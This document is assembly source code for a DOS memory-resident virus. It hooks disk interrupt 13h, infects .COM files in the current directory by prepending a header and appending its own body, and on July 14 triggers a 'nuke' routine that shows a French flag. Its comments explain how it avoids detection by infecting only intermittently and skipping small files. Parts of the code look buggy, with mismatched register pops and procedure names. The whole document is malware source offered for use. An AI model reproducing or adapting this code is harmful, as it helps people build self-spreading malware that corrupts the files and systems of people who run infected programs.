﻿

;INITIALIZATION CODE
;*******DO NOT CHANGE WITHOUT SETTING THE CORRECT # OF NOPS AND MARKER BYTE***
PUSH CS;0E (MARKER)
POP AX
MOV [108],AX;MODIFIES SEGMENT IN CALLF STATEMENT
DB 09A,11,01,00,00; CALLF 0000:0111 (OFFSET IS CUSTOM SET FOR EVERY FILE)
NOP
NOP
NOP
NOP
NOP
NOP; ALIGN TO END OF PARAGRAPH

F8_VEC EQU 03E0

;HERE IS THE FAKE USER PROGRAM THAT IS RUN 
RET; USER PROGRAM OVER

VIRUS_START_ADDR:

;VIRUS CODE (INIT) HERE:
; IS IT INSTALLED?
XOR AX,AX
PUSH AX
POP ES
MOV BX,04A
MOV AX,ES:[BX];OFFSET OF 13h
MOV CX,ES:[BX+2];SEG 13h
MOV ES,CX
MOV BX,AX
MOV AX,ES:[BX]
CMP AX,056; PUSH SI IS RARE AS THE FIRST BYTE
JE ALREADY_INSTALLED
;
MOV AH,02A
INT 021; GET DATE
CMP DX,0070E; THIS IS CHECKING FOR THE DATE. I SET THIS FOR THE 14th JULY
JNE VC1; (THE FRENCH NATIONAL HOLIDAY) THATS WHY IT DISPLAYS THE FRENCH
CALL NUKE; FLAG IN THIS ROUTINE. (THEN IT NUKES THE COMPUTER)
VC1:; SET DX FOR ANY DAY (SEE A DOS MANUAL) I.E. FRI 13, THURS 12, SAT 14
LEA AX,END_OF_FILE_ADDR; GET END OF FILE
LEA BX,VIRUS_START_ADDR;
SUB AX,BX
PUSH AX; SIZE OF VIRUS IN AX
INT 012; GET AMT OF MEM
SHL AX,6
SHR BX,4
INC BX; JUST TO BE SURE
SUB AX,BX; AX= LAST AVAIL SEGMENT TO STORE IN
MOV SVD_INT3,AX
PUSH AX
POP ES
LEA SI,VIRUS_START_ADDR
MOV DI,0
POP CX
INC CX; THIS MANY BYTES
REP MOVSB; LOAD INTO HIGHEST POSSIBLE MEMORY
;NOW WE MUST LOAD THE VECTORS
XOR AX,AX
MOV ES,AX
MOV BX,04A
MOV AX,ES:[BX]
MOV CX,ES:[BX+2]
MOV BX,03E0
MOV ES:[BX],AX
MOV ES:[BX+2],CX; $13H VECTOR GOES TO $F8h FOR CALLING IN HERE
MOV CX,SVD_INT3
LEA AX,INT_13_VEC
LEA BX,VIRUS_START_ADDR
SUB AX,BX
MOV BX,04A
MOV ES:[BX],AX
MOV ES:[BX+2],CX; INT_13_VEC GOES TO $13
ALREADY_INSTALLED:
;RESTORATION ROUTINES
POP CX ; POPS STORED IP FROM CALL
MOV CX,0100; PLACE TO START USER PROGRAM
POP AX ; POPS STORED SEG
INC AX ; START 16 BYTES LATER
PUSH AX
PUSH CX
; NOW WE HAVE TO RESTORE THE PSP BY MOVING EVERYTHING 16 BYTES AHEAD
PUSH CS
POP ES; SAME SEG
; LETS SET THE DIRECTION FLAG
STD
MOV SI,0FF
MOV DI,010F
MOV CX,0FF
REP MOVSB
;CLEAR IT AGAIN
CLD
; EVERYTHING IS SET UP FOR PROGRAM
RETF; RETURN TO USER PROGRAM


;HERE IS YOUR NUKE PROC:
; MINE DISPLAYS A FRENCH FLAG AND THEN DOES ITS THING

NUKE PROC NEAR
MOV AL,1
LV1:
CALL LINE
INC AL
CMP AL,26
JB LV1; DISPLAY FLAG
RET; ACTUALLY, THIS DOESNT MATTER
NUKE ENDP

LINE PROC NEAR; AL=WHICH LINE (1-25)
PUSH AX
PUSH BX
PUSH CX
PUSH DX
MOV AH,2
MOV BH,0
MOV DH,AL
MOV DL,1
INT 010; SET CURS POS
MOV AX,00920
MOV BX,010
MOV CX,26
INT 010
MOV AX,00920
MOV BX,070
MOV CX,27
INT 010
MOV AX,00920
MOV BX,040
MOV CX,27
INT 010
POP DX
POP CX
POP BX
POP AX
RET
LINE ENDP

; VECTORS HERE:

RENED_INT EQU 0F8; AT VIRUS INITIALIZATION, RENED_INT CALLS THE OLD
		 ; $13 FOR USE IN THIS VECTOR, 13 IS REMAPPED TO INT_13_VEC
COM_HAND DW 0000; 2 FILE HANDLES
REN_HAND DW 0000
SVD_INT1 DW 0000
SVD_INT2 DW 0000
SVD_INT3 DW 0000
OLD_DTA_OFF DW 0000;OLD VALUES OF DTA
OLD_DTA_SEG DW 0000
NEW_DTA_START DB 21 DUP(0); RESERVED BY DOS
F_ATTR DB 00
F_TIME DW 0000
F_DATE DW 0000
F_SIZE DW 0000
F_SIZE2 DW 0000
F_NAME DB 13 DUP(0)
READ_INTO DB 00;USED TO CHECK IF FILE BEGINS WITH 0E
F_NAME_TO_SEARCH DB "*.COM",00; WHEN F_NAME IS OVER-WRITTEN, REPLACE WITH THIS
;VIRUS HEADER (CODE EQUIV OF 1ST 16 BYTES) 
	VIRUS_HEADER DB 0E,058,0A3,08,01,09A
	VH_OFFSET DW 0000; OFFSET TO CUSTOM SET 
	VH_CONT DB 00,00,6 DUP(90) ; NOPS
TEMP_NAME DB 'TMP00.$$$',00
V_BUFFER DB 128 DUP(0)

INT_13_VEC PROC NEAR
PUSH SI;DONT REMOVE THIS LINE BECAUSE PUSH SI IS THE MARKER TO SEE IF INSTALLED
PUSH DI
PUSH AX
PUSH BX
PUSH CX
PUSH DX
PUSH DS
PUSH ES
CMP AH,2
JE > L1
CMP AH,3
JE > L1
JMP > L2
L1: 	INT 01A
	PUSH DX
	CMP DL,0E0; ONLY SOME OF THE TIME IT INFECTS THE DISK
	POP DX; THIS MAKES IT HARDER TO DETECT
	JB > L2; IF NOT TIME TO INFECT
	CALL INF_DISK
L2:
POP ES
POP DS
POP DX
POP CX
POP BX
POP AX
POP DI
POP SI
INT RENED_INT
IRET
INT_13_VEC ENDP



INF_DISK PROC NEAR
CALL REN_13
CALL NEW_DTA
CALL GET_FILE_NAME
CMP AL,1
JE INF1
CALL INFECT_FILE
INF1:
CALL OLD_DTA
CALL UN_REN_13
RET
INF_DISK ENDP


INFECT_FILE PROC NEAR
PUSH AX
PUSH BX
PUSH CX
PUSH DX
PUSH DS
PUSH ES
PUSH SI
PUSH DI
MOV AX,03DC0
PUSH CS
POP DS
LEA DX,F_NAME
INT 021
;AX=HANDLE
MOV COM_HAND,AX
MOV AH,03C
MOV CH,00
MOV CL,F_ATTR
LEA DX,TEMP_NAME
INT 021; CREATE FILE
JC ENDI
MOV AX,03DC1
INT 021; OPEN
JC ENDI
MOV REN_HAND,AX
MOV AX,F_SIZE
MOV BX,0110
ADD AX,BX
MOV VH_OFFSET,AX
MOV AH,040
MOV BX,REN_HAND
MOV CX,16
LEA DX,VIRUS_HEADER
INT 021; WRITE VIRUS HEADER
L_PLACE:
MOV AH,03F
MOV BX,COM_HAND
MOV CX,128
LEA DX,V_BUFFER
INT 021
CMP AX,0
JE GO_ON
MOV CX,AX
MOV AH,040
MOV BX,REN_HAND
LEA DX,VIRUS_HEADER
INT 021
JMP L_PLACE; GO UNTIL DONE
GO_ON:
;NOW THE VIRUS CODE MUST BE COPIED
LEA CX,END_OF_FILE_ADDR
LEA DX,VIRUS_START_ADDR
SUB CX,DX
MOV AH,040
MOV BX,REN_HAND
MOV DX,0
PUSH CS
POP DS
INT 021; ALL COPIED
MOV AH,03E
MOV BX,COM_HAND
INT 021
MOV BX,REN_HAND
INT 021
; EVERYTHING CLOSED
MOV AH,041
PUSH CS 
POP DS
MOV DX,OFFSET F_NAME
INT 021
MOV AH,056
PUSH CS 
PUSH CS
POP DS
POP ES
LEA DX,TEMP_NAME
LEA DI,F_NAME
INT 021;REN FILE
ENDI:
POP DI
POP SI
POP ES
POP DS
POP DX
POP CX
POP BX
POP AX
RET
INFECT_FILE ENDP


NEW_DTA PROC NEAR;MAKES A NEW DTA FOR SAFETY
PUSH AX
PUSH BX
PUSH DX
PUSH DS
PUSH ES
MOV AH,02Fh
INT 021h ; GET OLD DTA
MOV OLD_DTA_OFF,BX
MOV OLD_DTA_SEG,ES; STORE
MOV AH,01Ah
MOV DX,OFFSET NEW_DTA_START
PUSH CS
POP DS
INT 021h;CHANGE DTA
POP ES
POP DS
POP DX
POP BX
POP AX
RET
NEW_DTA ENDP

OLD_DTA PROC NEAR; CHANGES BACK TO OLD DTA
PUSH AX
PUSH DX
PUSH DS
MOV AH,01Ah
MOV DX,OLD_DTA_SEG
MOV DS,DX
MOV DX,OLD_DTA_OFF
INT 021h; SET DTA
RET
OLD_DTA ENDP

REN_13 PROC NEAR
PUSH AX
PUSH BX
PUSH CX
PUSH DX
PUSH DS
PUSH ES
MOV AX,00
MOV ES,AX
MOV BX,04Ah;13 VEC ADDR
MOV AX,ES:[BX]
MOV CX,ES:[BX+2]
MOV SVD_INT1,AX;SAVE OLD 13h VECTOR TO SVD_INT1&2
MOV SVD_INT2,CX;THIS BYPASSES THE CODE HERE AND ALLOWS RE-ENTRY OF $13
MOV BX,F8_VEC;INT F8 VECTOR
MOV AX,ES:[BX]
MOV CX,ES:[BX+2]
MOV BX,04A
MOV ES:[BX],AX
MOV ES:[BX+2],CX; ORIGINAL 13h PUT IN PLACE OF INT_13_VEC
POP AX
POP BX
POP CX
POP DX
POP DS
POP ES
RET
REN_13 ENDP

UN_REN_13 PROC NEAR
PUSH AX
PUSH BX
PUSH CX
PUSH ES
MOV AX,00
MOV ES,AX
MOV BX,04A
MOV AX,SVD_INT1
MOV CX,SVD_INT2
MOV ES:[BX],AX
MOV ES:[BX+2],CX
POP ES
POP CX
POP BX
POP AX
RET
UN_REN_13 ENDP

SUITABLE PROC NEAR; CHECKS NEW DTA AND OPENS FILE TO SEE IF IT HAS
PUSH BX;BEEN ALREADY INFECTED
PUSH CX	;RETURNS AL=0 IF OKAY TO INFECT, OTHERWISE AL=1
PUSH DX
PUSH DS
PUSH ES
CMP F_SIZE,1000
JB EXIT_WITH_ERROR; IF TOO SMALL, USER MAY SUSPECT
CMP F_SIZE,60000
JA EXIT_WITH_ERROR; DO NOT INFECT TOO BIG FILES
MOV AX,03DC0; OPEN FILE
LEA DX,F_NAME
PUSH CS
POP DS
INT 021h
JC EXIT_WITH_ERROR
MOV BX,AX
MOV AH,03Fh;
MOV CX,1
LEA DX,READ_INTO
PUSH CS
POP DS
INT 021h; LOAD FIRST BYTE INTO MEMORY
JC EXIT_WITH_ERROR
MOV AH,03Eh
INT 021h;CLOSE FILE
JC EXIT_WITH_ERROR
CMP READ_INTO,0E;ID BYTE
JE EXIT_READY_TO_INFECT;!!!!CONGRADULATIONS!!!!
EXIT_WITH_ERROR:
POP ES
POP DS
POP DX
POP CX
POP BX
MOV AL,1
RET
EXIT_READY_TO_INFECT:
POP ES
POP DS
POP DX
POP CX
POP BX
MOV AL,0
RET
SUITABLE ENDP

SEARCH_DIR PROC NEAR;RETURNS AL=0 IF F_NAME CONTAINS AN INFECTABLE FILE
PUSH BX
PUSH CX
PUSH DX
PUSH SI
PUSH DI
PUSH DS
PUSH ES
LEA DX,F_NAME_TO_SEARCH
PUSH CS
POP DS
MOV AH,04Eh; SEARCH FOR FIRST MATCH
MOV CX,6
INT 021h;
L1:
JC EXIT_ERR; NO MORE FILES
CALL SUITABLE
CMP AL,0
JE EXIT_FOUND
MOV AH,04Fh
INT 021h; SEARCH NEXT
JMP L1; LOOP UNTIL FOUND
EXIT_ERR:
POP ES
POP DS
POP DI
POP SI
POP DX
POP CX
POP BX
MOV AL,1
RET
EXIT_FOUND:
POP ES
POP DS
POP DI
POP SI
POP DX
POP CX
POP BX
MOV AL,0
RET
SEARCH_DIR ENDP

GET_FILE_NAME PROC NEAR;
CALL SEARCH_DIR ; CHECK CURRENT DIRECTORY FIRST
; TO MAKE THIS LESS NOTICEABLE AND TIME-CONSUMING, THIS WONT CHANGE
RET; DIRECTORIES BECAUSE REMEMBER EVERYTIME YOU CHANGE THE DIR,
; YOU GET A NEW ONE TO INFECT
GET_FILE ENDP

END_OF_FILE_ADDR:

